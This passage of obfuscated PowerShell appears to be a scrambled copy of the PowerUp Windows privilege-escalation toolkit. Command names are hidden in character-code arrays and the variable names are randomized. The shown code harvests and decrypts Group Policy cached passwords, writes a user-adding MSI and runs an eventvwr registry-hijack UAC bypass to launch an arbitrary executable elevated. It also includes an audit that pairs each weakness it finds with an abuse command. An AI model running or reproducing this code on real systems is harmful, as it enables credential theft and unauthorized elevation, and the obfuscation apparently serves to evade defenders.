                        $F36kDlAlTHJBM6QV2fO += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Groups/User/Properties/@newName" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $xM2QAYhsm9 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Groups/User/@changed" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                    }

                    'Services.xml' {
                        $ao9pjA4IEU8tQlmZhb6 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/NTServices/NTService/Properties/@cpassword" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $MJNrf2Xbpio7GuhH += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/NTServices/NTService/Properties/@accountName" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $xM2QAYhsm9 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/NTServices/NTService/@changed" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                    }

                    'Scheduledtasks.xml' {
                        $ao9pjA4IEU8tQlmZhb6 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/ScheduledTasks/Task/Properties/@cpassword" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $MJNrf2Xbpio7GuhH += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/ScheduledTasks/Task/Properties/@runAs" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $xM2QAYhsm9 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/ScheduledTasks/Task/@changed" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                    }

                    'DataSources.xml' {
                        $ao9pjA4IEU8tQlmZhb6 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/DataSources/DataSource/Properties/@cpassword" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $MJNrf2Xbpio7GuhH += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/DataSources/DataSource/Properties/@username" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $xM2QAYhsm9 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/DataSources/DataSource/@changed" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                    }

                    'Printers.xml' {
                        $ao9pjA4IEU8tQlmZhb6 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Printers/SharedPrinter/Properties/@cpassword" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $MJNrf2Xbpio7GuhH += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Printers/SharedPrinter/Properties/@username" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $xM2QAYhsm9 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Printers/SharedPrinter/@changed" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                    }

                    'Drives.xml' {
                        $ao9pjA4IEU8tQlmZhb6 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Drives/Drive/Properties/@cpassword" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $MJNrf2Xbpio7GuhH += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Drives/Drive/Properties/@username" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                        $xM2QAYhsm9 += , $rI8GYu4O0WkzwD | & ([string]::join('', ( (83,101,108,101,99,116,45,88,109,108) |%{ ( [char][int] $_)})) | % {$_}) "/Drives/Drive/@changed" | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Node | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {$_.Value}
                    }
                }
           }

           ForEach ($I in $ao9pjA4IEU8tQlmZhb6) {
               & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Decrypting $I"
               $fvpJpHCZIMytoIYXfxHAu = Get-DecryptedCpassword $I
               & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Decrypted a password of $fvpJpHCZIMytoIYXfxHAu"
               
               $IQ2MUGLwEkxjZ += , $fvpJpHCZIMytoIYXfxHAu
           }

            
            if (-not $IQ2MUGLwEkxjZ) {$IQ2MUGLwEkxjZ = '[BLANK]'}
            if (-not $MJNrf2Xbpio7GuhH) {$MJNrf2Xbpio7GuhH = '[BLANK]'}
            if (-not $xM2QAYhsm9)  {$xM2QAYhsm9 = '[BLANK]'}
            if (-not $F36kDlAlTHJBM6QV2fO)  {$F36kDlAlTHJBM6QV2fO = '[BLANK]'}

            
            $L2mJyAqihDVaTXwkRefPMFHBl = @{'Passwords' = $IQ2MUGLwEkxjZ;
                                  'UserNames' = $MJNrf2Xbpio7GuhH;
                                  'Changed' = $xM2QAYhsm9;
                                  'NewName' = $F36kDlAlTHJBM6QV2fO;
                                  'File' = $k8DbU}

            $YEat06FrgwieXNKxCZ = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -TypeName PSObject -Property $L2mJyAqihDVaTXwkRefPMFHBl
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "The password is between {} and may be more than one value."
            if ($YEat06FrgwieXNKxCZ) { Return $YEat06FrgwieXNKxCZ }
        }

        catch {& ([string]::join('', ( (87,114,105,116,101,45,69,114,114,111,114) |%{ ( [char][int] $_)})) | % {$_}) $Error[0]}
    }

    try {
        $c73v8izJAsjTkLUg2p = $BIU3V9yGRDMpzj2ugH:ALLUSERSPROFILE

        if ($c73v8izJAsjTkLUg2p -notmatch 'ProgramData') {
            $c73v8izJAsjTkLUg2p = "$c73v8izJAsjTkLUg2p\Application Data"
        }

        
        $65OgsHU3X7szo8RbbbiXGYbw = & (("NWPLigFVqQOdBCISuf6H-exAsT3M2z9ap8D07lYKJ5rtwn4joymXGbZvEkc1hRU")[52,21,43,20,13,60,4,37,11,14,43,21,50] -join '') -b3CtzFF8zYowylvWrqwrJZd $c73v8izJAsjTkLUg2p -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -xnW83q -ErrorAction SilentlyContinue

        if ( -not $65OgsHU3X7szo8RbbbiXGYbw ) {
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) 'No preference files found.'
        }
        else {
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Found $($65OgsHU3X7szo8RbbbiXGYbw | Measure-Object | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Count) files that could contain passwords."

            ForEach ($k8DbU in $65OgsHU3X7szo8RbbbiXGYbw) {
                Get-GppInnerField $k8DbU.Fullname
            }
        }
    }

    catch {
        & ([string]::join('', ( (87,114,105,116,101,45,69,114,114,111,114) |%{ ( [char][int] $_)})) | % {$_}) $Error[0]
    }
}


function Write-UserAddMSI {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.UserAddMSI')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $b3CtzFF8zYowylvWrqwrJZd = 'UserAdd.msi'
    )

    $jtus2daxqBC61LIXPM = ''

    try {
        [System.Convert]::FromBase64String( $jtus2daxqBC61LIXPM ) | & ([string]::join('', ( (83,101,116,45,67,111,110,116,101,110,116) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd $b3CtzFF8zYowylvWrqwrJZd -Encoding Byte
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "MSI written out to '$b3CtzFF8zYowylvWrqwrJZd'"

        $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'OutputPath' $b3CtzFF8zYowylvWrqwrJZd
        $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.UserAddMSI')
        $MZ8p5YquBs
    }
    catch {
        & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) "Error while writing to location '$b3CtzFF8zYowylvWrqwrJZd': $_"
    }
}


function Invoke-EventVwrBypass {


    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Dcg7PAwQMrbNMAn7ScBAec,

        [Switch]
        $xnW83q
    )
    $ecLQzZHG2RtKmh = (& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $yId5FR = (& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($ecLQzZHG2RtKmh -Eq 2 -And $yId5FR -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        
        $qZdtSEJ9c = "HKCU:\Software\Classes\mscfile\shell\open\command"
        $Dcg7PAwQMrbNMAn7ScBAec = $pshome + '\' + $Dcg7PAwQMrbNMAn7ScBAec
        
        if ($xnW83q -or ((& ([string]::join('', ( (71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd $qZdtSEJ9c -7GFj6Vi5MUh9X '(default)' -ErrorAction SilentlyContinue) -eq $BpZKcilASnhDR0mHwzFy)){
            & (("BV94LzcWnaSKyI2gwtUxYs-k5JZDrvfTuG83R1Pjmp6ONAHXM0QhoCqiEb7dFle")[44,62,16,22,13,17,62,40] -join '') $qZdtSEJ9c -xnW83q |
                & ([string]::join('', ( (78,101,119,45,73,116,101,109,80,114,111,112,101,114,116,121) |%{ ( [char][int] $_)})) | % {$_}) -7GFj6Vi5MUh9X '(Default)' -Value $Dcg7PAwQMrbNMAn7ScBAec -PropertyType string -xnW83q | & ([string]::join('', ( (79,117,116,45,78,117,108,108) |%{ ( [char][int] $_)})) | % {$_})
        }else{
            & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) "Key already exists, consider using -xnW83q"
            exit
        }

        if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') $qZdtSEJ9c) {
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Created registry entries to hijack the msc extension"
        }else{
            & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) "Failed to create registry key, exiting"
            exit
        }

        $vg7TioOBJLF = & (("zh8L7yKUGw1MQ2a9IAPBTe0tfCkE653cirjYuFVqDJv-bnWRgp4HlXZsNxSmdOo")[41,62,32,45,43,18,14,23,1] -join '') -b3CtzFF8zYowylvWrqwrJZd ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
        
        if ($BryvDUNZ6pweOX4h.ShouldProcess($vg7TioOBJLF, 'Start process')) {
            $PD8V6cl3vM1n0sURz = & (("bMinF75ScKeTm2CQlYz9xZRBvwNpktu-hs6I3OUaryfAXj4WGDg8PE0JVd1oHqL")[7,29,39,40,29,31,52,40,59,8,10,33,33] -join '') -FilePath $vg7TioOBJLF -PassThru
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Started eventvwr.exe"
        }

        
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |%{ ( [char][int] $_)})) | % {$_}) -Seconds 5
        }

        $CMBbXu1JcsyEL = "HKCU:\Software\Classes\mscfile"

        if (& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') $CMBbXu1JcsyEL) {
            
            & ([string]::join('', ( (82,101,109,111,118,101,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) $CMBbXu1JcsyEL -Recurse -xnW83q
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Removed registry entries"
        }

        if(& ([string]::join('', ( (71,101,116,45,80,114,111,99,101,115,115) |%{ ( [char][int] $_)})) | % {$_}) -s $PD8V6cl3vM1n0sURz.Id -ErrorAction SilentlyContinue){
            & (("vBRLho4mUNSIrFJZuaWCKqbYyjA3GOcwxMQEH8P095fnsg7zVXetpDki61-Td2l")[10,51,5,52,58,38,12,5,30,50,44,44] -join '') -s $PD8V6cl3vM1n0sURz.Id
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Killed running eventvwr process"
        }
    }
}


function Invoke-PrivescAudit {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [ValidateSet('Object','List','HTML')]
        [String]
        $wr = 'Object',
        [Switch]
        $1WYXK1pSMCejLMTIaiZYsQIn
    )

    if($1WYXK1pSMCejLMTIaiZYsQIn){ $wr = 'HTML' }

    if ($wr -eq 'HTML') {
        $dO0 = "$($BIU3V9yGRDMpzj2ugH:ComputerName).$($BIU3V9yGRDMpzj2ugH:UserName).html"
        $6trK0x7YvogMhX3pCZaND85P = "<style>"
        $6trK0x7YvogMhX3pCZaND85P = $6trK0x7YvogMhX3pCZaND85P + "BODY{background-color:peachpuff;}"
        $6trK0x7YvogMhX3pCZaND85P = $6trK0x7YvogMhX3pCZaND85P + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $6trK0x7YvogMhX3pCZaND85P = $6trK0x7YvogMhX3pCZaND85P + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $6trK0x7YvogMhX3pCZaND85P = $6trK0x7YvogMhX3pCZaND85P + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $6trK0x7YvogMhX3pCZaND85P = $6trK0x7YvogMhX3pCZaND85P + "</style>"
        & ([string]::join('', ( (67,111,110,118,101,114,116,84,111,45,72,84,77,76) |%{ ( [char][int] $_)})) | % {$_}) -Head $6trK0x7YvogMhX3pCZaND85P -Body "<H1>PowerUp report for '$($BIU3V9yGRDMpzj2ugH:ComputerName).$($BIU3V9yGRDMpzj2ugH:UserName)'</H1>" | & (("GYbqFIhxHRMw4S-vfc31QzWmaNtyneDE9ACg7ZBr8T06XoKdVpkUJ5islPu2LOj")[61,58,26,14,4,54,56,29] -join '') $dO0
    }

    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Running Invoke-PrivescAudit"

    $UNAWZb = @(
        
        @{
            Type    = 'User Has Local Admin Privileges'
            Command = { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){ & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject } }
        },
        @{
            Type        = 'User In Local Group with Admin Privileges'
            Command     = { if ((Get-ProcessTokenGroup | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty SID) -contains 'S-1-5-32-544'){ & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Dcg7PAwQMrbNMAn7ScBAec "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { Get-ProcessTokenPrivilege -1fMl18mNKjRq3g | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} }
        },
        
        @{
            Type    = 'Unquoted Service Paths'
            Command = { Get-UnquotedService }
        },
        @{
            Type    = 'Modifiable Service Files'
            Command = { Get-ModifiableServiceFile }
        },
        @{
            Type    = 'Modifiable Services'
            Command = { Get-ModifiableService }
        },
        
        @{
            Type        = '%PATH% .dll Hijacks'
            Command     = { Find-PathDLLHijack }
            AbuseScript = { "Write-HijackDll -Awr8sx01KB3l9zYpd6a '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (Get-RegistryAlwaysInstallElevated){ & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject } }
            AbuseScript = { 'Write-UserAddMSI' }
        },
        @{
            Type    = 'Registry Autologons'
            Command = { Get-RegistryAutoLogon }
        },
        @{
            Type    = 'Modifiable Registry Autorun'
            Command = { Get-ModifiableRegistryAutoRun }
        },
        
        @{
            Type    = 'Modifiable Scheduled Task Files'
            Command = { Get-ModifiableScheduledTaskFile }
        },
        @{
            Type    = 'Unattended Install Files'
            Command = { Get-UnattendedInstallFile }
        },
        @{
            Type    = 'Encrypted web.config Strings'
            Command = { Get-WebConfig | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { Get-ApplicationHost | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { Get-SiteListPassword | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { Get-CachedGPPPassword | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} }
        }
    )

    ForEach($23UY7iBO5aeczVxSMZnlX in $UNAWZb){
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Checking for $($23UY7iBO5aeczVxSMZnlX.Type)..."
        $4u6W9jY0C = . $23UY7iBO5aeczVxSMZnlX.Command
        $4u6W9jY0C | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
            $_ | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Check' $23UY7iBO5aeczVxSMZnlX.Type
            if ($23UY7iBO5aeczVxSMZnlX.AbuseScript){
                $_ | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'AbuseFunction' (. $23UY7iBO5aeczVxSMZnlX.AbuseScript)
            }
        }
        switch($wr){
            Object { $4u6W9jY0C }
            List   { "`n`n[*] Checking for $($23UY7iBO5aeczVxSMZnlX.Type)..."; $4u6W9jY0C | & ([string]::join('', ( (70,111,114,109,97,116,45,76,105,115,116) |%{ ( [char][int] $_)})) | % {$_}) }
            HTML   { $4u6W9jY0C | & ([string]::join('', ( (67,111,110,118,101,114,116,84,111,45,72,84,77,76) |%{ ( [char][int] $_)})) | % {$_}) -Head $6trK0x7YvogMhX3pCZaND85P -Body "<H2>$($23UY7iBO5aeczVxSMZnlX.Type)</H2>" | & (("GYbqFIhxHRMw4S-vfc31QzWmaNtyneDE9ACg7ZBr8T06XoKdVpkUJ5islPu2LOj")[61,58,26,14,4,54,56,29] -join '') -Append $dO0 }
        }
    }

    if ($wr -eq 'HTML') {
        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "[*] Report written to '$dO0' `n"
    }
}



$Module = New-InMemoryModule -jxmJKsPCaZlOB8FRywQ PowerUpModule


$ppPd8KS7Mcd = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @()),
    (func kernel32 OpenProcess ([IntPtr]) @([UInt32], [Bool], [UInt32]) -SetLastError),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 OpenProcessToken ([Bool]) @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
    (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
)


$JL2PUqKoXxHMEVw0N = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig             =   '0x00000001'
    ChangeConfig            =   '0x00000002'
    QueryStatus             =   '0x00000004'
    EnumerateDependents     =   '0x00000008'
    Start                   =   '0x00000010'
    Stop                    =   '0x00000020'
    PauseContinue           =   '0x00000040'
    Interrogate             =   '0x00000080'
    UserDefinedControl      =   '0x00000100'
    Delete                  =   '0x00010000'
    ReadControl             =   '0x00020000'
    WriteDac                =   '0x00040000'
    WriteOwner              =   '0x00080000'
    Synchronize             =   '0x00100000'
    AccessSystemSecurity    =   '0x01000000'
    GenericAll              =   '0x10000000'
    GenericExecute          =   '0x20000000'
    GenericWrite            =   '0x40000000'
    GenericRead             =   '0x80000000'
    AllAccess               =   '0x000F01FF'
} -kTTNmmcQEI

$AsjbtTXzCcel5 = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_MANDATORY              =   '0x00000001'
